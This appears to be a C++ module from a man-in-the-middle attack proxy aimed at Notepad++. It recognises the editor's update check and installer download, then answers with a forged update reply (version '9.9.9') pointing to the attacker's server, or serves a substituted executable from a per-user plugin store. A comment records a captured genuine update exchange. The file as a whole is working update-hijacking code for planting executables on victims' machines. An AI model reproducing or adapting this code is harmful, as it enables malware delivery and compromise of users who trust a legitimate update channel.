
#include "NotepadPP.h"
#include "../attacker.h"
#include "../HttpPartial.h"
#include "../HttpUtils.h"
#include "../cipher/CryptoUtils.h"
#include "../version.h"
#include "PluginServer.h"


int NotepadPP::isNotepadExe(string url, string host) {
	if (strstr(host.c_str(), "notepad-plus-plus.org") && strstr(url.c_str(), "/repository/") &&
		strstr(url.c_str(), "/npp.") && strstr(url.c_str(), ".Installer.exe"))
	{
		//http://notepad-plus-plus.org/repository/7.x/7.6.6/npp.7.6.6.Installer.exe
		return TRUE;
	}
	return FALSE;
}

int NotepadPP::replyNotepadExe(char * dstbuf, int dstbuflimit, LPHTTPPROXYPARAM http) {
	char * szHttpFormat = "HTTP/1.1 200 OK\r\n"
		"Connection: keep-alive\r\n"
		"Content-Type: application/octet-stream\r\n"
		"Content-Length: %u\r\n\r\n";

	string filename = Public::getUserUrl(http->username, QQMUSIC_UPDATE_FN);
	int ret = PluginServer::SendPluginFile(filename.c_str(), http, szHttpFormat, 1);
	return ret;
}

int NotepadPP::isNotepadPP(string url, string host) {
	if (strstr(host.c_str(), "notepad-plus-plus.org") && strstr(url.c_str(), "/update/getDownloadUrl.php?"))
	{
		return TRUE;
	}

	return FALSE;
}



int NotepadPP::replyNotepadPP(char * dstbuf, int dstbuflimit, LPSSLPROXYPARAM lpssl) {
	int ret = 0;
	char * lpRespFormat =
		"HTTP/1.1 200 OK\r\nContent-Length: %u\r\nContent-Type: text/xml\r\n"
		"Connection: keep-alive\r\n\r\n%s";
		//"Transfer-Encoding: chunked\r\n"
		//"Connection: keep-alive\r\n\r\n%02x\r\n%s";

	char * lpRespContentFormat =
		"<GUP><NeedToBeUpdated>yes</NeedToBeUpdated><Version>%s</Version><Location>http://%s/%s</Location></GUP>";

	//char * lpRespContentFormat =
	//	"<GUP><NeedToBeUpdated>yes</NeedToBeUpdated><Version>%s</Version><Location>http://%s/%s</Location></GUP>\r\n0\r\n\r\n";

	string fn = WEIXIN_PC_UPDATE_EXE_FILENAME;
	string szip = HttpUtils::getIPstr(gServerIP) + "/" + lpssl->username;
	//string szip = string(MYOWNSITE_ATTACK_DOMAINNAME) + "/" + lpssl->username;
	string filename = Public::getUserPluginPath(lpssl->username) + fn;


	string version = "9.9.9";

	char lpRespContent[MAX_RESPONSE_HEADER_SIZE];
	int iRespContentLen = sprintf_s(lpRespContent, MAX_RESPONSE_HEADER_SIZE, lpRespContentFormat,version.c_str(),
		szip.c_str(), fn.c_str() );
	//int resultlen = sprintf_s(dstbuf, dstbuflimit, lpRespFormat, iRespContentLen + 4, iRespContentLen, lpRespContent);
	int resultlen = sprintf_s(dstbuf, dstbuflimit, lpRespFormat, iRespContentLen, lpRespContent);
	return resultlen;
}


/*
ssl first packet:GET /update/getDownloadUrl.php?version=4.6 HTTP/1.1
Host: notepad-plus-plus.org
User-Agent: Notepad++/ (WinGup/4.2)
Accept: *//*

HTTP/1.1 200 OK
Server: nginx
Date: Wed, 01 May 2019 15:37:32 GMT
Content-Type: text/xml
Transfer-Encoding: chunked
Connection: keep-alive
Cache-Control: public
Expires: Thu, 02 May 2019 07:11:48 GMT
Notepad++: Thanks for flying Notepad++
Vary: Accept-Encoding
CDN: IWI.ME
CDN-ID: From Piko
Accept-Ranges: bytes
Strict-Transport-Security: max-age=15768000
X-Frame-Options: DENY
X-Content-Type-Options: nosniff

a7
<GUP><NeedToBeUpdated>yes</NeedToBeUpdated><Version>7.6.6</Version><Location>http://notepad-plus-plus.org/repository/7.x/7.6.6/npp.7.6.6.Installer.exe</Location></GUP>
0

*/